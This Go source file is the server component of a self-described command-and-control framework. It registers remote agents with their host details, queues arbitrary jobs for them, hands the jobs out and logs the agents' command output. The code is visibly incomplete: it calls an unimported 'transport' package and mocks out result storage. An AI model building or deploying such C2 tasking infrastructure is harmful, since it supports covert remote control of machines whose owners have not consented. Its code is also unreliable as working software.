package server

import (
	"context"
	"log"
	"sync"
	"time"

	"github.com/titan-c2/framework/internal/db"
	"github.com/titan-c2/framework/pkg/rpc"
)

type TitanServer struct {
	rpc.UnimplementedTitanC2Server
	db    *db.Database
	mu    sync.Mutex
	jobs  map[string][]*rpc.Job // Pending jobs per agent
}

func NewTitanServer(database *db.Database) *TitanServer {
	return &TitanServer{
		db:   database,
		jobs: make(map[string][]*rpc.Job),
	}
}

func (s *TitanServer) Heartbeat(ctx context.Context, req *rpc.HeartbeatRequest) (*rpc.HeartbeatResponse, error) {
	log.Printf("[Heartbeat] Agent: %s (%s/%s) - %s", req.AgentId, req.Platform, req.Architecture, req.Hostname)
	
	// Register agent in DB
	err := s.db.RegisterAgent(req.AgentId, req.Hostname, req.Platform, req.Architecture, req.IntegrityHash)
	if err != nil {
		log.Printf("Failed to register agent: %v", err)
	}

	s.mu.Lock()
	defer s.mu.Unlock()

	hasJobs := false
	if pending, ok := s.jobs[req.AgentId]; ok && len(pending) > 0 {
		hasJobs = true
	}

	return &rpc.HeartbeatResponse{
		HasJobs:    hasJobs,
		ServerTime: time.Now().Unix(),
		Status:     "active",
	}, nil
}

func (s *TitanServer) GetJobs(ctx context.Context, req *rpc.JobRequest) (*rpc.JobResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	jobs, ok := s.jobs[req.AgentId]
	if !ok || len(jobs) == 0 {
		return &rpc.JobResponse{}, nil
	}

	// Clear jobs after sending
	s.jobs[req.AgentId] = []*rpc.Job{}

	return &rpc.JobResponse{Jobs: jobs}, nil
}

func (s *TitanServer) SubmitOutput(ctx context.Context, req *rpc.OutputRequest) (*rpc.OutputResponse, error) {
	log.Printf("[Output] Job %s from Agent %s:\n%s", req.JobId, req.AgentId, string(req.Output))
	if req.Error != "" {
		log.Printf("[Output Error] %s", req.Error)
	}
	
	// Store result in DB (Mocked here)
	// s.db.SaveResult(...)

	return &rpc.OutputResponse{Received: true}, nil
}

// QueueJob is an internal method to add a job for an agent (called by UI/CLI)
func (s *TitanServer) QueueJob(agentID string, jobType string, args ...string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	
	job := &rpc.Job{
		JobId: transport.GenerateID(),
		Type:  jobType,
		Args:  args,
	}
	
	s.jobs[agentID] = append(s.jobs[agentID], job)
	log.Printf("[Control] Queued job %s for agent %s", job.JobId, agentID)
}
